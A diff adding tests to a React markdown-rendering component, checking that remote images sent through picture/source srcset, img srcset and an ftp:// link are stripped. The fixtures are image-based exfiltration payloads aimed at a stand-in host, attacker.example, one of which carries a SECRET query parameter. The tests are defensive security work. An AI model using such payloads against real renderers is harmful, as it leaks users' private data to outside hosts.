@@ -22,6 +22,29 @@ describe("StreamMarkdown images", () => {
     expect(screen.getByText(/Image blocked: secret/)).toBeTruthy();
   });
 
+  it.each([
+    [
+      "picture/source srcset (QA BUG-001)",
+      '<picture><source srcset="https://attacker.example/x.png?q=SECRET"><img src="/favicon.ico" alt="a"></picture>',
+    ],
+    ["img srcset", '<img src="/favicon.ico" srcset="https://attacker.example/x.png 2x" alt="a">'],
+  ])("drops a remote %s", (_label, md) => {
+    for (const streaming of [false, true]) {
+      const { container, unmount } = render(<StreamMarkdown content={md} streaming={streaming} />);
+      expect(container.innerHTML).not.toContain("attacker.example");
+      expect(container.querySelector("source, [srcset]")).toBeNull();
+      // While streaming the text inks in gradually, so the image may not be shown yet.
+      if (!streaming) expect(images(container)).toEqual(["/favicon.ico"]);
+      unmount();
+    }
+  });
+
+  it("blocks an image with a non-http scheme", () => {
+    const { container } = render(<StreamMarkdown content="![x](ftp://attacker.example/x.png)" />);
+    expect(container.innerHTML).not.toContain("attacker.example");
+    expect(container.querySelector("img")).toBeNull();
+  });
+
   it("blocks a remote image while streaming too", () => {
     const { container } = render(
       <StreamMarkdown content="![x](https://attacker.example/x.png)" streaming />,
